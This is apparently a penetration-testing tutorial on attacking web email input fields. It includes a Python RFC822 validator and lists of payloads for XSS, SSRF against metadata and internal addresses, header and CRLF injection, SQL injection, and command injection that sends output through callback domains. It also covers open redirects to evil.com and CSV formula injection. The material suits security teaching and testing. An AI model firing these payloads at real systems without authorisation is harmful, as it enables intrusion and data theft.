Introduction
Email input fields are a critical attack surface in web applications. Attackers often target these fields to exploit vulnerabilities ranging from XSS and SSRF to header injection and business logic flaws. This article provides a detailed methodology for testing email input fields including both foundational and advanced techniques with practical payloads for each scenario.

Email Format Validation: The RFC822 Standard in Action
Start by using an RFC822-compliant validator tool to test how the application handles a variety of valid and invalid email formats. Enter each case into the tool’s input field and note whether the tool marks it as valid or invalid, as this reveals the strength or weakness of the application’s email validation logic.

Example Test Cases:

| Email Address                                 | Expected (RFC822) | Notes                          |
|-----------------------------------------------|-------------------|--------------------------------|
| simple@example.com                            | Valid             | Standard format                |
| very.common@example.com                       | Valid             | Dots in local part             |
| disposable.style.email.with+symbol@example.com| Valid             | Plus symbol in local part      |
| user@[192.168.1.1]                            | Valid             | Address literal (rare, valid)  |
| "much.more unusual"@example.com               | Valid             | Quoted local part              |
| admin@mailserver1                             | Valid             | Local domain name (no TLD)     |
| plainaddress                                  | Invalid           | Missing @ and domain           |
| @missinglocal.org                             | Invalid           | Missing local part             |
| username@.com                                 | Invalid           | Leading dot in domain          |
| username@-example.com                         | Invalid           | Leading hyphen in domain       |
| username@example..com                         | Invalid           | Double dot in domain           |
| username@exam_ple.com                         | Invalid           | Underscore in domain           |
| test@examp℮.com                               | Invalid           | Unicode character in domain    |
RFC822-Email-Validator Script:
I created a simple Python script to validate email addresses based on the RFC822 standard. It allows you to test a wide range of email input formats for compliance.

Script

import re
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# RFC822-compliant regex (simplified for practical use)
RFC822_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*"
    r'|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")'
    r"@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*)$"
)

def is_rfc822_valid(email):
    return bool(RFC822_REGEX.match(email))

if __name__ == "__main__":
    email = input("Enter email address: ").strip()
    if is_rfc822_valid(email):
        print(f"RFC822 valid: {Fore.GREEN}YES{Style.RESET_ALL}")
    else:
        print(f"RFC822 valid: {Fore.RED}NO{Style.RESET_ALL}")
usage:
Run the script: python rfc822_email_validator.py
Enter the email address you want to validate when prompted.
Result: The script will print “RFC822 valid: YES” if the email is valid, or “RFC822 valid: NO” if not.

Now I’ll walk you through various methods to test email input fields for different types of vulnerabilities and edge cases..

Cross-Site Scripting (XSS)
XSS can occur if user-supplied email addresses are reflected unsanitized in web pages, JavaScript or emails.

Testing Approach:
Register or submit forms with XSS payloads as the email.
Observe where the email is reflected: HTML, attributes, JavaScript or emails.
Example Payloads:

"><script>alert(1)</script>@test.com
"><svg/onload=alert(3)>@test.com
"><svg/onload=confirm(1337)>"@x.y
poc

Server-Side Request Forgery (SSRF)
Applications may validate emails by making outbound requests (e.g., MX record checks, avatar fetching). Improper handling can lead to SSRF.

Testing Approach:
Use a service like Burp Collaborator or requestbin to monitor for outbound requests.
Submit emails that point to your controlled domain or internal IPs.
Example Payloads:

test@your-burpcollaborator.net
test@requestbin.net
test@127.0.0.1
test@localhost
test@169.254.169.254
Email Header Injection
If user input is directly inserted into email headers, attackers can inject additional headers or manipulate the email content.

Testing Approach:
Register or reset password using payloads with CRLF sequences.
Analyze the raw email headers received.
Example Payloads:

test@example.com%0d%0aBCC:attacker@example.com
test@example.com\r\nBCC:attacker@example.com
test@example.com%0aCC:attacker@example.com
test@example.com\r\nContent-Type:text/html\r\n\r\n<b>Injected</b>
SQL Injection
If the email is used in database queries without proper sanitization, SQL injection may be possible.

Testing Approach:
Submit SQLi payloads in the email field.
Monitor for errors, unexpected behavior or data leakage.
Example Payloads:

test' OR '1'='1@example.com
test" OR "1"="1@example.com
test@example.com'--
test@example.com") OR 1=1--
Command Injection
If the email is used in system commands, command injection may be possible.

Testing Approach:
Submit command injection payloads.
Monitor for command execution or errors.
Example Payloads:

test@example.com; whoami
test@example.com && id
test@example.com | uname -a
test@example.com`id`
`whoami`.yourdomain.oast.fun
$(whoami).yourdomain.oast.fun
${USER}.yourdomain.oast.fun
test@$(whoami).xyz.oast.fun
Open Redirect
If the email is used in URLs (e.g., confirmation links), test for open redirect vulnerabilities.

Testing Approach:
Manipulate URLs or parameters using the email field.
Example Payloads:

test@example.com%0d%0aLocation:https://evil.com
test@example.com/?next=https://evil.com
IDOR/Enumeration
Test for user enumeration or Insecure Direct Object Reference (IDOR) by submitting known or guessed emails.

Testing Approach:
Attempt registration, password reset or other actions with known emails.
Monitor for differences in responses.
Example Payloads:

admin@example.com
user@example.com
test@example.com
Format Bypass/Validation Bypass
Test for weak validation by submitting unusual but technically valid email formats.

Testing Approach:
Submit emails with edge-case formats or Unicode characters.
Example Payloads:

"test@evil.com"@example.com
test@subdomain..com
test@-example.com
test@.com
test@exam_ple.com
test@examp℮.com
CRLF Injection
Carriage Return and Line Feed (CRLF) injection can be used to manipulate headers in HTTP responses or emails.

Testing Approach:
Submit payloads with CRLF sequences.
Monitor for header injection or splitting.
Example Payloads:

test@example.com%0d%0aInjected-Header: injected
test@example.com%0aInjected-Header: injected
Business Logic Abuse
Flaws in business logic can allow attackers to bypass email verification, escalate privileges or create duplicate accounts.

Testing Approach:
Attempt to register the same email multiple times.
Try to change your email to another user’s email.
Intercept and modify requests during the email verification process.
Unicode and Homograph Attacks
Unicode characters can be used to create visually similar but distinct email addresses, potentially bypassing validation or enabling phishing.

Testing Approach:
Submit emails with Unicode homoglyphs or unusual characters.
Example Payloads:

test@exаmple.com   (Cyrillic "a")
test@examp℮.com
Injection in Downstream Systems
If emails are used in logs, exports or integrations they may be vulnerable to log injection, CSV injection or other attacks.

Testing Approach:
Register with payloads that could affect downstream systems.
Request data exports or check logs if accessible.
Example Payloads:

=cmd|' /C calc'!A0
"=HYPERLINK(\"http://evil.com\")"
test@example.com\nInjectedLogEntry
Rate Limiting and Enumeration
Lack of rate limiting can allow attackers to enumerate valid users or brute-force tokens.

Testing Approach:
Automate password reset or registration attempts with different emails.
Monitor responses for differences indicating valid or invalid emails.
Conclusion
A complete assessment of email input fields requires testing for a wide range of vulnerabilities, from classic injection attacks to business logic and integration flaws. By using the methods and payloads described above you can uncover and help remediate critical security issues in your applications.
